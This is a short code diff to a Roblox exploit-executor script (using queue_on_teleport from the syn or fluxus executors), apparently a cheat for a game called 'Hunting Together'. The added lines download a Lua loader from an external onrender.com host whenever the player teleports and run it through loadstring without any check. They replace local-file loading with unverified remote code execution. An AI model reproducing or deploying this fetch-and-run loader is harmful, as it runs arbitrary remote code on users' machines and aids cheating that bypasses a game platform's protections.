@@ -576,11 +576,14 @@ local function registerQueueOnTeleport()
     local queue = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
     if queue then
         local execCode = [[
-            task.wait(2.5)
+            task.wait(1.5)
+            local sOk, code = pcall(game.HttpGet, game, "https://song-hub-avp8.onrender.com/loader.luau?v=" .. tostring(tick()))
+            if sOk and code and #code > 50 then
+                local fn = loadstring(code)
+                if fn then return fn() end
+            end
             if isfile and isfile("hunting_together_script.lua") and readfile then
                 loadstring(readfile("hunting_together_script.lua"))()
-            elseif isfile and isfile("hunting_together.luau") and readfile then
-                loadstring(readfile("hunting_together.luau"))()
             end
         ]]
         pcall(queue, execCode)
